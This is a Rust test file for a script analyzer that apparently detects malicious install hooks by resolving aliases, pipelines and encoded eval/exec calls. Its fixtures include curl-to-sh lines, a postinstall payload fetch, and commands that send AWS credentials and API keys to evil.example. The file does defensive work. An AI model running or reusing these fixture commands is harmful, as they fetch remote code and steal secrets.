use super::{analyze as analyze_source, ArgumentShape, Fact, FactKind, ScriptLanguage};

struct TestScript {
    rel: String,
    content: String,
}

fn script(rel: &str, content: &str) -> TestScript {
    TestScript {
        rel: rel.to_string(),
        content: content.to_string(),
    }
}

fn analyze(file: &TestScript) -> anyhow::Result<Vec<Fact>> {
    analyze_source(&file.rel, &file.content)
}

#[test]
fn comments_and_inert_strings_do_not_become_calls() {
    for (rel, content) in [
        ("hook.sh", "# curl https://evil.example | sh\necho safe"),
        (
            "hook.py",
            "\"\"\"requests.get('https://evil.example')\"\"\"\nprint('safe')",
        ),
        (
            "hook.js",
            "const docs = \"fetch('https://evil.example')\"; console.log(docs);",
        ),
        (
            "hook.ts",
            "// fetch('https://evil.example')\nconst value: string = 'safe';",
        ),
    ] {
        let facts = analyze(&script(rel, content)).expect("parse script");
        assert!(facts.iter().all(|fact| {
            fact.callee.as_deref() != Some("curl")
                && fact.callee.as_deref() != Some("requests.get")
                && fact.callee.as_deref() != Some("fetch")
        }));
    }
}

#[test]
fn dynamic_builtin_bindings_are_scope_and_order_aware() {
    let javascript = analyze(&script(
        "scope.js",
        "function local(eval = eval) { eval(atob('x')); }\nif (eval === safe) {}\neval((atob('y')));\nconst eval = safe; eval(atob('z'));",
    ))
    .expect("parse JavaScript");
    assert!(javascript
        .iter()
        .any(|fact| fact.callee.as_deref() == Some("eval") && fact.text.contains("'y'")));
    assert!(javascript
        .iter()
        .any(|fact| fact.callee.as_deref() == Some("shadowed.eval")));
    assert!(javascript
        .iter()
        .any(|fact| fact.callee.as_deref() == Some("shadowed.eval") && fact.text.contains("'x'")));
    assert!(analyze_source_encoded("scope.js", "eval((atob('y')));"));

    let python = analyze(&script(
        "scope.py",
        "def local(eval=eval):\n    eval(base64.b64decode('x'))\nif eval == safe:\n    pass\neval(base64.b64decode('y'))\nexec(base64.b64decode('z'))",
    ))
    .expect("parse Python");
    assert!(python
        .iter()
        .any(|fact| fact.callee.as_deref() == Some("shadowed.eval")));
    assert!(python
        .iter()
        .any(|fact| fact.callee.as_deref() == Some("eval") && fact.text.contains("'y'")));
    assert!(python
        .iter()
        .any(|fact| fact.callee.as_deref() == Some("exec")));
    assert!(analyze_source_encoded(
        "scope.py",
        "exec(base64.b64decode('z'))"
    ));
}

#[test]
fn javascript_new_function_is_a_constructor_fact_with_all_arguments() {
    let facts = analyze(&script(
        "constructor.js",
        "new Function( /* comment */ 'arg', atob('body'));\nconst x = 1 / 2;",
    ))
    .expect("parse JavaScript");
    let constructor = facts
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("Function"))
        .expect("constructor fact");
    assert!(constructor.arguments.len() >= 2);
    assert!(constructor
        .arguments
        .last()
        .is_some_and(|argument| argument.raw.starts_with("atob")));
    assert!(analyze_source_encoded(
        "constructor.js",
        "new Function('arg', atob('body'))"
    ));
}

#[test]
fn python_fstring_marker_requires_nested_dynamic_call() {
    analyze(&script(
        "fstring.py",
        "exec(f\"{base64.b64decode('bytes')}\")\nexec(f\"{eval(base64.b64decode('code'))}\")",
    ))
    .expect("parse Python");
    assert!(!analyze_source_encoded(
        "fstring.py",
        "exec(f\"{base64.b64decode('bytes')}\")"
    ));
    assert!(analyze_source_encoded(
        "fstring.py",
        "exec(f\"{eval(base64.b64decode('code'))}\")"
    ));
}

#[test]
fn encoded_decoder_identity_respects_shadowing_and_declarations() {
    assert!(!analyze_source_encoded(
        "shadow.js",
        "const atob = local; eval(atob('x'));"
    ));
    assert!(!analyze_source_encoded(
        "shadow.py",
        "base64 = local\nexec(base64.b64decode('x'))"
    ));
    assert!(!analyze_source_encoded(
        "decl.js",
        "function eval() {}\neval(atob('x'));"
    ));
    let catch_source = "try {} catch (eval) { eval(atob('x')); }";
    assert!(!analyze_source_encoded("catch.js", catch_source));
    assert!(!analyze_source_encoded(
        "catch.py",
        "try:\n    pass\nexcept Exception as eval:\n    eval(base64.b64decode('x'))"
    ));
    assert!(analyze_source_encoded(
        "default.js",
        "function run(x = eval(atob('x'))) {}"
    ));
    assert!(!analyze_source_encoded(
        "default-shadowed.js",
        "function run(eval = eval(atob('x'))) {}"
    ));
    assert!(!analyze_source_encoded(
        "import.js",
        "import {atob} from './safe.js'; eval(atob('x'));"
    ));
    assert!(!analyze_source_encoded(
        "import.py",
        "import local as base64\nexec(base64.b64decode('x'))"
    ));
    assert!(analyze_source_encoded(
        "method.js",
        "const obj = { atob() { eval(atob('x')); } }; eval(atob('x'));"
    ));
    assert!(analyze_source_encoded(
        "method-body.js",
        "const obj = { atob() { eval(atob('x')); } };"
    ));
    assert!(analyze_source_encoded(
        "method-eval.js",
        "const obj = { eval() {} }; eval(atob('x'));"
    ));
    assert!(!analyze_source_encoded(
        "method-param.js",
        "const obj = { run(eval) { eval(atob('x')); } };"
    ));
    assert!(analyze_source_encoded(
        "named-expression.js",
        "const f = function atob() {}; eval(atob('x'));"
    ));
    assert!(!analyze_source_encoded(
        "named-expression-body.js",
        "const f = function atob() { eval(atob('x')); };"
    ));
    assert!(!analyze_source_encoded(
        "named-expression-eval.js",
        "const f = function eval() { eval(atob('x')); };"
    ));
}

fn analyze_source_encoded(path: &str, source: &str) -> bool {
    super::analyze_encoded_dynamic_execution(path, source).expect("parse source")
}

#[test]
fn resolves_python_alias_and_constant_concatenation() {
    let facts = analyze(&script(
        "collect.py",
        "import requests as r\nBASE = 'https://collector.example'\nr.get(BASE + '/v1')",
    ))
    .expect("parse python");
    let call = facts
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("requests.get"))
        .expect("aliased requests call");
    assert_eq!(
        call.arguments[0].resolved.as_deref(),
        Some("https://collector.example/v1")
    );
}

#[test]
fn resolves_shell_alias_and_variable_url() {
    let facts = analyze(&script(
        "collect.sh",
        "BASE=https://collector.example\nalias send=curl\nsend \"$BASE/v1\"",
    ))
    .expect("parse shell");
    let command = facts
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("curl"))
        .expect("aliased curl command");
    assert_eq!(
        command.arguments[0].resolved.as_deref(),
        Some("https://collector.example/v1")
    );
}

#[test]
fn gh102_env_split_string_normalizes_pipeline_source() {
    for content in [
        "env -S 'curl https://evil.example/x' | sh",
        "env --split-string='curl https://evil.example/x' | sh",
    ] {
        let facts = analyze(&script("collect.sh", content)).expect("parse shell");
        let pipeline = facts
            .iter()
            .find(|fact| fact.kind == FactKind::Pipeline)
            .expect("pipeline fact");
        assert_eq!(pipeline.callee.as_deref(), Some("curl"), "{content}");
    }
}

#[test]
fn resolves_javascript_import_alias_and_concat() {
    let facts = analyze(&script(
        "collect.js",
        "import client from 'axios'; const base = 'https://collector.example'; client.post(base + '/v1');",
    ))
    .expect("parse javascript");
    let call = facts
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("axios.post"))
        .expect("aliased axios call");
    assert_eq!(
        call.arguments[0].resolved.as_deref(),
        Some("https://collector.example/v1")
    );
}

#[test]
fn resolves_callable_reference_aliases() {
    let javascript = analyze(&script(
        "collect.js",
        "const originalFetch = globalThis.fetch; originalFetch('https://collector.example/v1');",
    ))
    .expect("parse javascript");
    assert!(javascript
        .iter()
        .any(|fact| fact.callee.as_deref() == Some("globalThis.fetch")));

    let python = analyze(&script(
        "collect.py",
        "import requests\nsend = requests.get\nsend('https://collector.example/v1')",
    ))
    .expect("parse python");
    assert!(python
        .iter()
        .any(|fact| fact.callee.as_deref() == Some("requests.get")));
}

#[test]
fn resolves_typescript_constant_concat() {
    let facts = analyze(&script(
        "collect.ts",
        "const scheme: string = 'https://'; const host = 'collector.example'; fetch(scheme + host + '/v1');",
    ))
    .expect("parse typescript");
    let call = facts
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("fetch"))
        .expect("typescript fetch call");
    assert_eq!(
        call.arguments[0].resolved.as_deref(),
        Some("https://collector.example/v1")
    );
}

#[test]
fn bindings_follow_source_order_and_dynamic_assignments_invalidate_constants() {
    let facts = analyze(&script(
        "collect.py",
        "import requests\nurl = input()\nrequests.get(url)\nurl = 'https://later.example'\nold = 'https://stale.example'\nold = input()\nrequests.get(old)",
    ))
    .expect("parse python");
    let calls: Vec<&Fact> = facts
        .iter()
        .filter(|fact| fact.callee.as_deref() == Some("requests.get"))
        .collect();
    assert_eq!(calls.len(), 2);
    assert_eq!(calls[0].arguments[0].resolved, None);
    assert_eq!(calls[1].arguments[0].resolved, None);
}

#[test]
fn function_scope_does_not_replace_module_binding() {
    let facts = analyze(&script(
        "collect.py",
        "import requests\nurl = 'https://outer.example'\ndef inner():\n    url = 'https://inner.example'\n    requests.get(url)\nrequests.get(url)",
    ))
    .expect("parse python");
    let calls: Vec<&Fact> = facts
        .iter()
        .filter(|fact| fact.callee.as_deref() == Some("requests.get"))
        .collect();
    assert_eq!(calls.len(), 2);
    assert_eq!(
        calls[0].arguments[0].resolved.as_deref(),
        Some("https://inner.example")
    );
    assert_eq!(
        calls[1].arguments[0].resolved.as_deref(),
        Some("https://outer.example")
    );
}

#[test]
fn resolves_javascript_named_import_alias() {
    let facts = analyze(&script(
        "run.js",
        "import { exec as run } from 'child_process'; run('echo safe');",
    ))
    .expect("parse javascript");
    assert!(facts
        .iter()
        .any(|fact| fact.callee.as_deref() == Some("child_process.exec")));
}

#[test]
fn resolves_commonjs_destructured_alias() {
    let facts = analyze(&script(
        "run.js",
        "const { exec: run } = require('child_process'); run('echo safe');",
    ))
    .expect("parse javascript");
    assert!(facts
        .iter()
        .any(|fact| fact.callee.as_deref() == Some("child_process.exec")));
}

#[test]
fn conditional_reassignment_invalidates_outer_constant() {
    let facts = analyze(&script(
        "collect.py",
        "import requests\nurl = 'https://safe.example'\nif enabled:\n    url = input()\nrequests.get(url)",
    ))
    .expect("parse python");
    let call = facts
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("requests.get"))
        .expect("requests call");
    assert_eq!(call.arguments[0].resolved, None);
}

#[test]
fn malformed_supported_script_fails_closed() {
    let error = analyze(&script("broken.py", "def broken(:\n  pass"))
        .expect_err("malformed source must fail");
    assert!(error.to_string().contains("incomplete Python syntax parse"));
}

#[test]
fn unsupported_script_is_explicit() {
    let facts = analyze(&script("hook.rb", "puts 'hello'")).expect("unsupported fact");
    assert_eq!(facts[0].kind, FactKind::Unsupported);
}

#[test]
fn explicit_language_supports_virtual_execution_surfaces() {
    let facts = super::analyze_with_language(
        "package.json:scripts/postinstall",
        "curl https://evil.example/payload | sh",
        ScriptLanguage::Bash,
    )
    .expect("parse explicit Bash");
    assert!(facts.iter().any(|fact| fact.kind == FactKind::Pipeline));
}

#[test]
fn infers_all_supported_node_extensions() {
    for path in ["index.js", "index.mjs", "index.cjs"] {
        assert_eq!(ScriptLanguage::from_path(path), ScriptLanguage::JavaScript);
    }
    for path in ["index.ts", "index.mts", "index.cts"] {
        assert_eq!(ScriptLanguage::from_path(path), ScriptLanguage::TypeScript);
    }
}

#[test]
fn gh102_facts_preserve_source_language() {
    let shell = analyze(&script("run.sh", "eval \"echo safe\"")).expect("parse shell");
    assert!(shell.iter().any(
        |fact| fact.callee.as_deref() == Some("eval") && fact.language == ScriptLanguage::Bash
    ));

    let python = analyze(&script("run.py", "eval('echo safe')")).expect("parse python");
    assert!(python
        .iter()
        .any(|fact| fact.callee.as_deref() == Some("eval")
            && fact.language == ScriptLanguage::Python));
}

#[test]
fn gh102_shell_provenance_preserves_literal_suffix() {
    let facts = analyze(&script(
        "collect.sh",
        "CRED=\"$HOME/.aws/credentials\"\necho \"$CRED\"",
    ))
    .expect("parse shell");
    let assignment = facts
        .iter()
        .find(|fact| fact.kind == FactKind::Assignment)
        .expect("assignment fact");
    assert_eq!(
        assignment.arguments[0].executable_reference.as_deref(),
        Some("$HOME/.aws/credentials")
    );
    let echo = facts
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("echo"))
        .expect("echo command");
    assert!(echo.arguments[0]
        .executable_reference
        .as_deref()
        .is_some_and(|reference| reference.contains("$HOME/.aws/credentials")));
}

#[test]
fn gh102_shell_provenance_does_not_invent_literal_or_dynamic_suffixes() {
    for source in [
        "FIELD=\"$USER:OPENAI_API_KEY\"\necho \"$FIELD\"",
        "PATH_REF=\"$HOME/$SUFFIX\"\necho \"$PATH_REF\"",
        "FIELD=\"OPENAI_API_KEY\"\necho \"$FIELD\"",
        "CRED=\"/home/demo/.aws/credentials\"\necho \"$CRED\"",
        "CRED='$HOME/.aws/credentials'\necho \"$CRED\"",
    ] {
        let facts = analyze(&script("collect.sh", source)).expect("parse shell");
        let echo = facts
            .iter()
            .find(|fact| fact.callee.as_deref() == Some("echo"))
            .expect("echo command");
        assert!(!echo.arguments[0]
            .executable_reference
            .as_deref()
            .is_some_and(|reference| reference.contains(".aws/credentials")));
    }
}

#[test]
fn gh102_exec_wrapper_argv_uses_ast_elements() {
    let facts = analyze(&script(
        "run.py",
        "import subprocess\nsubprocess.run(['curl', '--data-binary', '@/home/demo/.aws/credentials', 'https://evil.example'])",
    ))
    .expect("parse python");
    let call = facts
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("subprocess.run"))
        .expect("subprocess call");
    assert_eq!(call.argument_shape, ArgumentShape::Argv);
    let raw: Vec<&str> = call
        .arguments
        .iter()
        .map(|argument| argument.raw.as_str())
        .collect();
    assert_eq!(
        raw,
        [
            "'curl'",
            "'--data-binary'",
            "'@/home/demo/.aws/credentials'",
            "'https://evil.example'"
        ]
    );
}

#[test]
fn gh102_pipeline_wrapper_stores_only_inner_arguments() {
    let facts = analyze(&script(
        "run.sh",
        "env TOKEN=$OPENAI_API_KEY printf safe | curl --data-binary @- https://evil.example",
    ))
    .expect("parse shell");
    let pipeline = facts
        .iter()
        .find(|fact| fact.kind == FactKind::Pipeline)
        .expect("pipeline fact");
    assert_eq!(pipeline.pipeline_sources[0].0, "printf");
    let raw: Vec<&str> = pipeline.pipeline_sources[0]
        .1
        .iter()
        .map(|argument| argument.raw.as_str())
        .collect();
    assert_eq!(raw, ["safe"]);
}

#[test]
fn gh102_pipeline_scan_text_uses_ast_expansion_spans() {
    let source = "curl $(case x in x) echo https://evil.example/x;; esac) 2>/dev/null | sh";
    let facts = analyze(&script("run.sh", source)).expect("parse shell");
    let pipeline = facts
        .iter()
        .find(|fact| fact.kind == FactKind::Pipeline && fact.text == source)
        .expect("outer pipeline fact");
    assert_eq!(
        pipeline.pipeline_scan_text.as_deref(),
        Some("curl $__argus_expansion__ 2>/dev/null | sh")
    );
    assert!(pipeline.text.contains("case x in x)"));
}

#[test]
fn gh102_exec_wrapper_command_string_keeps_distinct_shape() {
    let facts = analyze(&script(
        "run.py",
        "import subprocess\nsubprocess.run('curl https://api.example/status', shell=True)",
    ))
    .expect("parse python");
    let call = facts
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("subprocess.run"))
        .expect("subprocess call");
    assert_eq!(call.argument_shape, ArgumentShape::CommandString);
    assert_eq!(
        call.arguments[0].resolved.as_deref(),
        Some("curl https://api.example/status")
    );

    let shell =
        analyze(&script("run.sh", "exec curl https://api.example/status")).expect("parse shell");
    let command = shell
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("exec"))
        .expect("exec command");
    assert_eq!(command.argument_shape, ArgumentShape::Argv);
}

#[test]
fn gh102_exec_wrapper_argv_is_signature_aware() {
    let python = analyze(&script(
        "run.py",
        "import subprocess\nsubprocess.run(check=True, args=['curl', '--data-binary', '@/home/demo/.aws/credentials'])",
    ))
    .expect("parse python");
    let call = python
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("subprocess.run"))
        .expect("subprocess call");
    assert_eq!(call.argument_shape, ArgumentShape::Argv);
    assert_eq!(call.arguments[0].resolved.as_deref(), Some("curl"));

    let javascript = analyze(&script(
        "run.js",
        "child_process.spawn('curl', {env: {TOKEN: process.env.OPENAI_API_KEY}});",
    ))
    .expect("parse javascript");
    let spawn = javascript
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("child_process.spawn"))
        .expect("spawn call");
    assert_eq!(spawn.argument_shape, ArgumentShape::Argv);
    assert_eq!(spawn.arguments.len(), 1);
    assert_eq!(spawn.arguments[0].resolved.as_deref(), Some("curl"));
}

#[test]
fn extensionless_shebang_selects_language() {
    let bash = analyze_source(
        "hook",
        "#!/usr/bin/env bash\ncurl https://example.invalid/x | sh\n",
    )
    .expect("bash shebang");
    assert!(bash
        .iter()
        .any(|fact| fact.language == ScriptLanguage::Bash));

    let python =
        analyze_source("hook", "#!/usr/bin/env python3\nprint('ok')\n").expect("python shebang");
    assert!(python
        .iter()
        .all(|fact| fact.language == ScriptLanguage::Python));
}

#[test]
fn extensionless_without_shebang_stays_unsupported() {
    assert_eq!(
        ScriptLanguage::from_source("hook", "plain text\n"),
        ScriptLanguage::Unsupported
    );
}
